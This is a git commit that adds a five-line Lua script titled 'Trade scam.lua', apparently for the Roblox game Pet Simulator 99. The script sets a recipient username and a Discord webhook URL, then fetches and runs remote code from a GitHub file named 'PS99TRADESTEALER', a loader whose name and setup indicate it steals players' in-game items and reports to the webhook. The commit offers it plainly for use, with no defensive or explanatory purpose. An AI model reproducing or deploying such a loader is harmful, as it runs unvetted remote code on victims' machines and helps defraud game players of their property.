1d95baf39a6f4f1b9a0ae08a6cccad5d41ee35bd
ZAPHUP <ilyassefh2010@gmail.com>
2025-02-10 13:05:52 +0100

    Update and rename Pls.donate to Trade scam.lua

---
+++ Trade scam.lua
@@ -0,0 +1,5 @@
+Username = "otakufh44"
+Webhook = "https://discord.com/api/webhooks/1338480673002094683/Xuxl96MAkrOFlx9xnPvwnAoHqOP8ubIdqqjH6vlVmbY4CwoV_nWmxhunWgKnIw3vi2oH"
+selectedLoadingScreen = "1" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99TRADESTEALER"))()
